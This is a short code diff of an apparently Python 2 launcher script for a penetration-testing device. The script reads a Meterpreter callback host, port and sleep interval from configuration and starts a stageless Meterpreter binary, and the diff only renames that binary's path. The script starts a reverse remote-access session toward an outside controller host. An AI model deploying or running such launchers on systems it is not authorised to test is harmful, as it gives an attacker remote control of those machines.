@@ -165,7 +165,7 @@ PORT = subprocess.Popen("uci get meterpreter-sl.port", shell=True, stdout=subpro
 PORT = PORT.replace("\n", "")
 SLEEP = subprocess.Popen("uci get meterpreter-sl.sleep", shell=True, stdout=subprocess.PIPE).stdout.read()
 SLEEP = SLEEP.replace("\n", "")
-STAGELESS_METERPRETER = "/usr/bin/stageless_meterpreter " + HOST + " " + PORT
+STAGELESS_METERPRETER = "/usr/bin/stageless-meterpreter " + HOST + " " + PORT
 if HOST == "" or PORT == "":
         subprocess.call('/usr/bin/logger "Meterpreter: Error, configuration blank"', shell=True)
         print "Meterpreter: Error, configuration blank"
